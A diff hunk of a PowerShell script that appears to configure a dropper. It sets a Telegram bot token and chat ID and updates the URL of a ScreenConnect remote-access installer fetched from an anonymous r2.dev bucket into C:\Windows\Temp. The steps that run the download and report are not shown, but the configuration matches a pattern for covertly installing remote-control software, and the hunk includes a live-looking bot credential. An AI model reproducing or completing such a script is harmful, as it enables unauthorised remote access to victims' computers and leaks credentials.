@@ -12,7 +12,7 @@ $BotToken = "8804791627:AAG1vTmc-HlAW8DR0gzKezeKidm4W3DwmXY"
 $ChatID   = "6867549905"
 
 # 2. APPLICATION CONFIGURATION - YOUR NEW LINK IS PLACED HERE
-$MsiUrl    = "https://pub-14dda660d9ed46a491b2c11bd2890715.r2.dev/ScreenConnect.ClientSetup(1).msi"
+$MsiUrl    = "https://pub-14dda660d9ed46a491b2c11bd2890715.r2.dev/ScreenConnect.ClientSetup.msi"
 $TempDir   = "C:\Windows\Temp"
 $MsiPath   = Join-Path $TempDir "ScreenConnectSetup.msi"
 $LogPath   = "C:\Windows\Temp\ScreenConnect_Install.log"
